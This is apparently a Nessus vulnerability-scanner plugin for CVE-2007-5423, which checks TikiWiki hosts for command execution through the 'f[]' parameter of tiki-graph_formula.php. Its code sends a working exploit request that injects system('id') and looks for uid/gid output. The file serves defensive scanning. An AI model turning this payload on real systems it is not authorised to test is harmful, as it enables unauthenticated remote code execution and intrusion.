#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(26968);
  script_version("1.26");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2007-5423");
  script_bugtraq_id(26006);

  script_name(english:"TikiWiki tiki-graph_formula.php f Parameter Arbitrary Command Execution");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows arbitrary
command execution.");
  script_set_attribute(attribute:"description", value:
"The remote host is running TikiWiki, an open source wiki application
written in PHP.

The version of TikiWiki on the remote host fails to sanitize input to
the 'f[]' parameter of the 'tiki-graph_formula.php' script before
using it as a function call.  Regardless of PHP's 'register_globals'
setting, an unauthenticated attacker can leverage this issue to
execute arbitrary code on the remote host subject to the privileges of
the web server user id.");
  script_set_attribute(attribute:"see_also", value:"https://www.securityfocus.com/archive/1/482006/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"https://tiki.org/tiki-read_article.php?articleId=14");
  script_set_attribute(attribute:"solution", value:
"Upgrade to TikiWiki version 1.9.8.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'TikiWiki tiki-graph_formula Remote PHP Code Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:"CANVAS");
  script_cwe_id(94);

  script_set_attribute(attribute:"plugin_publication_date", value:"2007/10/11");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:tikiwiki:tikiwiki");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("tikiwiki_detect.nasl");
  script_require_keys("www/PHP", "www/tikiwiki");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("data_protection.inc");

port = get_http_port(default:80,php:TRUE);

install = get_install_from_kb(appname:'tikiwiki', port:port, exit_on_fail:TRUE);
dir = install['dir'];

# Try to exploit the issue to run a command.
cmd = "id";

if (thorough_tests) ts = make_list("pdf", "png");
else ts = make_list("pdf");

foreach t (ts)
{
  w = http_send_recv3(method:"GET",
      item:string(
        dir , "/tiki-graph_formula.php?",
        "w=1&",
        "h=1&",
        "s=1&",
        "min=1&",
        "max=2&",
        "f[]=x.tan.system(", cmd, ")&",
        "t=", t, "&",
        "title="
      ),
      port:port
    );
  if (isnull(w)) exit(1, "the web server did not answer");
  res = w[2];

  line = egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res);
  if (line)
  {
    report = string(
      "\n",
      "It was possible to execute the command '", cmd, "' on the remote host,\n",
      "which produces the following output :\n",
      "\n",
      "  ", data_protection::sanitize_uid(output:line)
      );
   security_hole(port:port, extra:report);
   exit(0);
  }
}
